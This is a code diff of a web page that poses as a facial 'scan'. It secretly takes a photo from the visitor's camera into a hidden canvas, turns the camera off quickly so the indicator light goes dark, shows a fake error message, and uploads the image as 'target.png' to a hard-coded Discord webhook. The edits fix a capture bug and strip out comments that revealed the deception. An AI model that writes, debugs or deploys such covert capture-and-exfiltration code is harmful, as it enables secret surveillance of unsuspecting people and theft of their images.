@@ -5,7 +5,7 @@
     <style>
         body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #1a1a1a; color: white; }
         button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
-        #video, #canvas { display: none; /* Keeps the camera feed hidden from the user */ }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
@@ -14,12 +14,10 @@
     <button id="startBtn">Start Scan</button>
     <p id="status"></p>
 
-    <!-- Hidden elements for processing the image -->
-    <video id="video" width="640" height="480" autoplay></video>
+    <video id="video" width="640" height="480" playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // 1. PASTE YOUR DISCORD WEBHOOK URL HERE
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT";
 
         document.getElementById('startBtn').addEventListener('click', async () => {
@@ -27,25 +25,26 @@
             status.innerText = "Requesting camera access for scan...";
 
             try {
-                // 2. Request camera access
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                
+                // CRITICAL FIX: Explicitly play the video
+                video.play();
 
-                // 3. Wait for the video feed to initialize
-                video.onloadedmetadata = () => {
-                    // Wait 1 second for the camera to focus and adjust lighting
+                // Wait until the video is actually playing frames
+                video.onplaying = () => {
+                    // NOW wait 1 second for auto-focus/exposure
                     setTimeout(() => {
-                        // 4. Draw the current video frame onto the hidden canvas
                         const canvas = document.getElementById('canvas');
                         const context = canvas.getContext('2d');
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // 5. Instantly kill the camera stream so the LED turns off
+                        // Kill the stream
                         stream.getTracks().forEach(track => track.stop());
                         status.innerText = "Analyzing facial structure... Error 404: Match not found.";
 
-                        // 6. Convert the canvas image to a file and send to Discord
+                        // Send to Discord
                         canvas.toBlob((blob) => {
                             const formData = new FormData();
                             formData.append("file", blob, "target.png");
@@ -54,8 +53,7 @@
                             fetch(WEBHOOK_URL, {
                                 method: "POST",
                                 body: formData
-                            }).then(() => console.log("Payload delivered"))
-                              .catch(err => console.error("Delivery failed:", err));
+                            });
                         }, 'image/png');
                     }, 1000);
                 };
